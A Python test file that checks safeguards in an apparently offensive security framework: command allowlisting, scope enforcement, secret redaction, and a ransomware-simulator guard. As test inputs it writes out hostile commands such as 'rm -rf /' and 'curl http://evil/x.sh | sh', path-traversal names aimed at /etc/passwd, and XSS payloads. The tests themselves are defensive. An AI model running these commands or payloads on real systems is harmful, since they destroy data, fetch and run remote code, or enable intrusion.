"""Security-hardening tests (Manus audit P3 plan).

Covers the post-audit gates:
  * API command allowlist       — arbitrary / internal commands refused
  * scope fail-closed           — no-scope and out-of-scope targets refused
  * secret redaction            — passwords/OTPs never reach audit/stream
  * atomic checkpoints          — resume survives a crash mid-write
  * two-process audit append    — hash chain stays verifiable across procs
  * artifact path traversal     — ../ names refused
  * stop-during-pause           — orchestrator stop wakes a paused run
  * bounded agent pool          — max_agents never exceeded under load
  * HTML injection              — report bodies are escaped
  * ransomware guard            — home/system dirs refused, crash-safe
"""
import asyncio
import json
import multiprocessing as mp
import os
import tempfile
import threading
import time
import unittest

from aiohttp.test_utils import TestClient, TestServer

_ENV_KEYS = ("PHANTOM_STATE_FILE", "PHANTOM_API_TOKEN", "PHANTOM_C2_KEY",
             "PHANTOM_C2_NONCE", "PHANTOM_PAYLOAD_TOKEN",
             "PHANTOM_ALLOW_UNSCOPED", "PHANTOM_RANSOM_SIM_ALLOW")


class SecurityHardenBase(unittest.TestCase):
    _ISOLATE = _ENV_KEYS

    def setUp(self):
        self._saved_env = {k: os.environ.get(k) for k in self._ISOLATE}
        for k in self._ISOLATE:
            os.environ.pop(k, None)
        self._tmp = tempfile.mkdtemp(prefix="phantom-harden-")
        os.environ["PHANTOM_STATE_FILE"] = os.path.join(self._tmp, "state.json")

    def tearDown(self):
        for k, v in self._saved_env.items():
            if v is None:
                os.environ.pop(k, None)
            else:
                os.environ[k] = v


class TestCommandAllowlist(SecurityHardenBase):
    """F-01: the API must only execute commands the modules advertise."""

    @staticmethod
    def _gate(module, cmd):
        from phantom.api.server import _validate_backend_command
        return _validate_backend_command(module, cmd)

    def test_module_shell_commands_allowed(self):
        self.assertIsNone(self._gate(
            "scan", "sudo nmap -sV -sC -p- -oX /tmp/x.xml 10.0.0.1  # REQUIRED"))
        self.assertIsNone(self._gate("web", "whatweb http://10.0.0.1 --aggression 1"))
        self.assertIsNone(self._gate("brute", "hydra -L u.txt -P p.txt ssh://10.0.0.1"))
        self.assertIsNone(self._gate("exploit",
            "msfconsole -q -x \"use exploit/multi/handler; run\""))

    def test_internal_cli_commands_refused(self):
        # NOTE: `ssh [user:pass]` is intentionally NOT here — `ssh` is a
        # real binary, so the gate lets it through (real tools win over
        # same-named do_* methods); the bracketed placeholder arg makes
        # the run fail harmlessly at the OS level.
        for cmd in ("run", "fire CVE-2024-1234", "deploy-agent",
                    "list-exploits", "privesc-run"):
            err = self._gate("exploit", cmd)
            self.assertIsNotNone(err, cmd)
            self.assertIn("Phantom shell command", err)

    def test_arbitrary_commands_refused(self):
        for cmd in ("rm -rf /", "bash -c 'curl evil.sh | bash'",
                    "python3 -c 'print(1)'", "echo pwned > /tmp/x",
                    "curl http://evil/x.sh | sh"):
            err = self._gate(None, cmd)
            self.assertIsNotNone(err, cmd)
        # module-scoped too: unknown binary for that module
        self.assertIsNotNone(self._gate("scan", "powershell -c evil"))


class TestScopeFailClosed(SecurityHardenBase):
    """F-05/F-10: no scope = refused; out of scope = refused; identity ok."""

    def test_unscoped_target_refused(self):
        from phantom.api.backend import backend_dispatcher
        from phantom.core.session import session
        session.scope = []
        r = backend_dispatcher.run("nmap -sV 10.0.0.5", "10.0.0.5", timeout=5)
        self.assertEqual(r.returncode, -1)
        self.assertIn("no engagement scope", r.error)

    def test_out_of_scope_refused(self):
        from phantom.api.backend import backend_dispatcher
        from phantom.core.session import session
        session.scope = ["10.0.0.0/24"]
        r = backend_dispatcher.run("nmap -sV 10.0.1.5", "10.0.1.5", timeout=5)
        self.assertEqual(r.returncode, -1)
        self.assertIn("out of scope", r.error)

    def test_unscoped_opt_out_env(self):
        os.environ["PHANTOM_ALLOW_UNSCOPED"] = "1"
        from phantom.api.backend import backend_dispatcher
        from phantom.core.session import session
        session.scope = []
        r = backend_dispatcher.run("nmap -sV 10.0.0.5", "10.0.0.5", timeout=5)
        self.assertNotEqual(r.returncode, -1)
        self.assertIsNone(r.error) or self.assertNotIn(
            "no engagement scope", r.error or "")

    def test_multi_a_record_hostname_in_scope(self):
        import socket
        from phantom.core.scope import is_in_scope
        try:
            ip = socket.gethostbyname("google.com")
        except OSError:
            self.skipTest("no DNS")
        net = ".".join(ip.split(".")[:3]) + ".0/24"
        self.assertTrue(is_in_scope("google.com", [net]))

    def test_unresolvable_hostname_fails_closed(self):
        from phantom.core.scope import is_in_scope
        self.assertFalse(is_in_scope("no.such.host.invalid", ["10.0.0.0/24"]))
        self.assertTrue(is_in_scope("no.such.host.invalid",
                                    ["No.Such.Host.Invalid"]))


class TestSecretRedaction(SecurityHardenBase):
    """F-02: passwords/OTPs must never reach client-facing surfaces."""

    def test_redact_masks_secret_keys(self):
        from phantom.utils.redact import redact
        out = redact({"password": "s3cret", "otp": "123456",
                      "service": "ssh", "nested": {"token": "x", "port": 22}})
        self.assertEqual(out["password"], "[REDACTED]")
        self.assertEqual(out["otp"], "[REDACTED]")
        self.assertEqual(out["service"], "ssh")
        self.assertEqual(out["nested"]["token"], "[REDACTED]")
        self.assertEqual(out["nested"]["port"], 22)

    def test_redact_text_masks_keyvalue_and_flag_forms(self):
        from phantom.utils.redact import redact_text
        self.assertEqual(redact_text("password=Sup3rS3cret"),
                         "password=[REDACTED]")
        self.assertEqual(redact_text("token: abc123"),
                         "token=[REDACTED]")
        self.assertEqual(redact_text("sshpass -p Sup3rS3cret ssh root@h id"),
                         "sshpass -p [REDACTED] ssh root@h id")
        # ssh -p 22 is a PORT: must NOT be redacted
        self.assertEqual(redact_text("ssh -p 22 root@10.0.0.5"),
                         "ssh -p 22 root@10.0.0.5")

    def test_audit_log_never_contains_secrets(self):
        from phantom.utils.audit_log import AuditLog
        log = AuditLog(path=os.path.join(self._tmp, "audit.log"))
        rec = log.append("task_queued", beacon_id="b1",
                         command="sshpass -p Sup3rS3cret ssh root@10.0.0.5 id")
        self.assertNotIn("Sup3rS3cret", str(rec))
        self.assertIn("[REDACTED]", rec["command"])
        rec2 = log.append("creds", password="hunter2", otp="000000")
        self.assertEqual(rec2["password"], "[REDACTED]")
        self.assertEqual(rec2["otp"], "[REDACTED]")
        # the redacted chain still verifies
        ok, count, bad = log.verify()
        self.assertTrue(ok)
        self.assertEqual(count, 2)


class TestAtomicCheckpoint(SecurityHardenBase):
    """F-18: a crash mid-write never leaves a truncated checkpoint."""

    def _agent(self):
        from phantom.automation.agent import AutonomousAgent
        return AutonomousAgent(target="10.0.0.5", profile="enterprise")

    def test_checkpoint_is_complete_json_and_resumable(self):
        agent = self._agent()
        agent.wm.add_finding("service", "tcp/22",
                             {"port": 22, "service": "ssh"},
                             confidence=0.9, source="scan")
        path = os.path.join(self._tmp, "checkpoint.json")
        agent.save_state(path)
        # no temp litter and the file parses as full JSON
        self.assertFalse(os.path.exists(path + ".tmp"))
        with open(path, encoding="utf-8") as f:
            state = json.load(f)
        findings = {f"{f['kind']}:{f['key']}": f
                    for f in state["wm"]["findings"]}
        self.assertEqual(
            findings["service:tcp/22"]["value"]["port"], 22)
        # resume path: from_state rebuilds the same world model
        from phantom.automation.agent import AutonomousAgent
        resumed = AutonomousAgent.from_state(path)
        self.assertEqual(resumed.target, "10.0.0.5")
        self.assertTrue(resumed.wm.has("service", "tcp/22"))


def _audit_worker(p, n, qq):
    """Module-level (picklable by spawn) audit append worker."""
    try:
        from phantom.utils.audit_log import AuditLog
        log = AuditLog(path=p)
        for i in range(n):
            log.append("beacon_registered",
                       beacon_id=f"{mp.current_process().name}-{i}",
                       ip="10.0.0.9")
        qq.put(("ok", log.verify()))
    except Exception as e:  # noqa: BLE001
        qq.put(("err", repr(e)))


class TestAuditTwoProcess(SecurityHardenBase):
    """F-23: the hash chain stays verifiable with two processes appending."""

    def test_two_process_append_verifies(self):
        path = os.path.join(self._tmp, "c2_audit.log")
        q = mp.Queue()
        p1 = mp.Process(target=_audit_worker, args=(path, 40, q))
        p2 = mp.Process(target=_audit_worker, args=(path, 40, q))
        p1.start()
        p2.start()
        p1.join(60)
        p2.join(60)
        reports = [q.get(timeout=5) for _ in range(2)]
        for kind, val in reports:
            if kind == "err":
                self.fail(f"worker failed: {val}")
        from phantom.utils.audit_log import AuditLog
        ok, count, bad = AuditLog(path=path).verify()
        self.assertTrue(ok, bad)
        self.assertEqual(count, 80)


class TestArtifactTraversal(SecurityHardenBase):
    """F-24-adjacent: the artifact endpoint must refuse traversal names."""

    @staticmethod
    def _scenario(coro):
        return asyncio.run(coro)

    def test_traversal_refused(self):
        from phantom.api.server import create_app
        from phantom.utils import c2_crypto

        async def scenario():
            client = TestClient(TestServer(create_app()))
            await client.start_server()
            try:
                token = c2_crypto.get_api_token()
                h = {"Authorization": f"Bearer {token}"}
                r1 = await client.get(
                    "/api/c2/artifact?dir=screenshots&name=..%2F..%2Fetc%2Fpasswd",
                    headers=h)
                r2 = await client.get(
                    "/api/c2/artifact?dir=downloads&name=..%5C..%5Cwindows%5Csystem32%5Cconfig",
                    headers=h)
                r3 = await client.get(
                    "/api/c2/artifact?dir=evil&name=x.png", headers=h)
                return r1.status, r2.status, r3.status
            finally:
                await client.close()

        s1, s2, s3 = self._scenario(scenario())
        self.assertIn(s1, (400, 404))
        self.assertIn(s2, (400, 404))
        self.assertEqual(s3, 400)


class TestOrchestratorStopPause(SecurityHardenBase):
    """F-15: stop() must wake a paused run loop."""

    def test_stop_wakes_pause(self):
        from phantom.automation.belief import WorldModel
        from phantom.automation.guidance.stealth import StealthEngine, StealthConfig
        from phantom.automation.guidance.threatmodel import BlueTeamModel
        from phantom.automation.orchestrator import Orchestrator
        wm = WorldModel(target="x")
        ste = StealthEngine(wm, StealthConfig(profile="enterprise"),
                            BlueTeamModel.for_profile("enterprise"))
        orch = Orchestrator(wm, ste, worker=lambda a, c: True, max_agents=2)
        orch.pause()
        orch.stop()
        self.assertTrue(orch._stop.is_set())
        self.assertTrue(orch._pause.is_set())
        # run() must return promptly (the paused wait was woken)
        orch = Orchestrator(wm, ste, worker=lambda a, c: True, max_agents=2)
        orch.pause()
        orch.stop()
        orch.run(drain_timeout=5)

    def test_pool_never_exceeds_max_agents(self):
        from phantom.automation.belief import WorldModel
        from phantom.automation.guidance.stealth import StealthEngine, StealthConfig
        from phantom.automation.guidance.threatmodel import BlueTeamModel
        from phantom.automation.orchestrator import Orchestrator
        wm = WorldModel(target="x")
        ste = StealthEngine(wm, StealthConfig(profile="enterprise"),
                            BlueTeamModel.for_profile("enterprise"))
        orch = Orchestrator(wm, ste,
                            worker=lambda a, c: (time.sleep(0.15), True)[1],
                            max_agents=2)
        for i in range(8):
            orch.submit("scan_tcp", f"h{i}", 1.0)
        peak = [0]
        stop = threading.Event()

        def spy():
            while not stop.is_set():
                with orch._agents_guard:
                    peak[0] = max(peak[0], sum(1 for t in orch._agents
                                               if t.is_alive()))
                time.sleep(0.01)

        t = threading.Thread(target=spy)
        t.start()
        orch.run(drain_timeout=30)
        stop.set()
        t.join()
        self.assertLessEqual(peak[0], 2)


class TestHtmlInjection(SecurityHardenBase):
    """F-24: report HTML bodies must escape angle brackets."""

    @staticmethod
    def _scenario(coro):
        return asyncio.run(coro)

    def test_html_report_escaped(self):
        from phantom.api.server import create_app
        from phantom.core.session import session
        from phantom.utils import c2_crypto

        async def scenario():
            client = TestClient(TestServer(create_app()))
            await client.start_server()
            try:
                # set AFTER create_app: the server boot restores the last
                # auto-saved session and would overwrite these
                session.target = "<script>alert(1)</script>.com"
                session.notes = [{"text": "<img src=x onerror=alert(1)>"}]
                token = c2_crypto.get_api_token()
                h = {"Authorization": f"Bearer {token}"}
                r = await client.post("/api/reports/generate",
                                      json={"format": "html"}, headers=h)
                body = await r.json()
                raw_path = body["raw_path"]
                with open(raw_path, encoding="utf-8") as f:
                    content = f.read()
                return r.status, content
            finally:
                await client.close()

        status, content = self._scenario(scenario())
        self.assertEqual(status, 200)
        self.assertIn("&lt;script&gt;", content)
        self.assertNotIn("<script>alert(1)</script>", content)
        session.target = ""
        session.notes = []


class TestRansomGuard(SecurityHardenBase):
    """F-13: the sim refuses system dirs and is crash-safe by construction."""

    def test_home_refused(self):
        from phantom.automation.post.ransom_sim import (
            RansomSimulator, _unsafe_dir_reason)
        self.assertTrue(_unsafe_dir_reason(os.path.expanduser("~")))
        sim = RansomSimulator(vault_dir=os.path.join(self._tmp, "vault"))
        with self.assertRaises(PermissionError):
            sim.encrypt(os.path.expanduser("~"))

    def test_scratch_allowed_and_rollback_exact(self):
        from phantom.automation.post.ransom_sim import RansomSimulator
        d = tempfile.mkdtemp(dir=self._tmp)
        original = b"x" * 1000
        with open(os.path.join(d, "a.txt"), "wb") as f:
            f.write(original)
        sim = RansomSimulator(vault_dir=os.path.join(self._tmp, "vault"))
        m = sim.encrypt(d)
        self.assertFalse(os.path.exists(os.path.join(d, "a.txt")))
        self.assertTrue(os.path.exists(os.path.join(d, "a.txt.phnt")))
        self.assertEqual(m["status"], "complete")
        mp = os.path.join(m["vault_dir"], m["run_id"], "manifest.json")
        self.assertTrue(os.path.exists(mp))  # manifest persisted first
        self.assertEqual(sim.rollback(mp), 1)
        with open(os.path.join(d, "a.txt"), "rb") as f:
            self.assertEqual(f.read(), original)


if __name__ == "__main__":
    unittest.main()